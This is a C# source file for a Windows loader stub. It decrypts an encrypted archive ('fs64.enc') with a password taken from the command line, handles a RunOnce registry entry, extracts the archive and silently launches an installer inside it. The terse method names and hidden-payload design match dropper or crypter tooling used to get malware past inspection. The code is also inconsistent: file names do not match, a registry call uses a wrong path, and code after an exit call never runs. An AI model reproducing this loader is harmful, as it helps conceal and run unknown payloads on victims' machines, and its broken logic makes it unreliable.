
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace tc32k

{
    static class Program
    {
        private static void Ef(string iFs, string oFs, string pd)
        {

            try
            {
                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(pd);

                string cryptFile = oFs;
                FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt,
                    RMCrypto.CreateEncryptor(key, key),
                    CryptoStreamMode.Write);

                FileStream fsIn = new FileStream(iFs, FileMode.Open);

                int data;
                while ((data = fsIn.ReadByte()) != -1)
                    cs.WriteByte((byte)data);


                fsIn.Close();
                cs.Close();
                fsCrypt.Close();
            }
            catch (Exception er)
            {
                MessageBox.Show(er.ToString());
            }
        }
        private static void Df(string iFs, string oFs, string pd)
        {

            {

                UnicodeEncoding UE = new UnicodeEncoding();
                byte[] key = UE.GetBytes(pd);

                FileStream fsCrypt = new FileStream(iFs, FileMode.Open);

                RijndaelManaged RMCrypto = new RijndaelManaged();

                CryptoStream cs = new CryptoStream(fsCrypt,
                    RMCrypto.CreateDecryptor(key, key),
                    CryptoStreamMode.Read);

                FileStream fsOut = new FileStream(oFs, FileMode.Create);

                int data;
                while ((data = cs.ReadByte()) != -1)
                    fsOut.WriteByte((byte)data);

                fsOut.Close();
                cs.Close();
                fsCrypt.Close();

            }
        }
        private static void Sed(string dr) {
            string foo = dr + "\\fs64.zip";
            string To = dr;
            System.IO.Compression.ZipFile.ExtractToDirectory(foo,To);
            File.Delete(foo);
        }
        private static void Su( string y )
        {
            try
            {
                string del = y + "\\tc32k.exe";
                string KeyName = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\tc32k";
                RegistryKey Hkey = Registry.CurrentUser;
                Hkey.DeleteValue(KeyName);
            } catch{ }
        }

        [STAThread]
        static void Main(string[] args)

        {
            string pa = Directory.GetCurrentDirectory();
            int la = args.Length - 1;
            string pwd = args[la];
            Df(pa + "\\fs64.enc", pa + "\\yourPayLoad.zip", pwd);
            try
            {    
                Su(pa);
                Sed(pa);
            }
            catch (Exception t) { Console.Write(t); }
            string exv = pa + "\\yourPayLoad\\YourInstaller.exe";
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.WorkingDirectory = pa + "\\yourPayLoad";
            ps.FileName = exv;
            Process.Start(ps);
            Environment.Exit(0);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            Environment.Exit(0);
        }

    }

}
